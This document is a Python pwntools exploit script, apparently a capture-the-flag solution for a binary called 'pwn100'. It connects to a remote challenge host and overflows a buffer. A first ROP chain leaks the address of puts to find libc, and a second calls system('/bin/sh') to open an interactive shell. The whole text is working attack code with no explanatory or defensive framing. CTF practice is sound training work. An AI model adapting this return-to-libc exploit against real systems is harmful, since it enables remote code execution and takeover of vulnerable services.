from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwn100")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn100")
else:
	p = remote("111.198.29.45",32252)
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn100")

pop_rdi_ret = 0x0000000000400763
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = 0x4006B8
padding = "a" * (0x40 + 8)
payload = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = payload.ljust(0xC8,"\x00")
p.send(payload)
p.recvuntil("bye~\n")
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))

system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr) + p64(main_addr)
payload = payload.ljust(0xC8,"\x00")
p.send(payload)
p.recvuntil("bye~\n")
p.interactive()
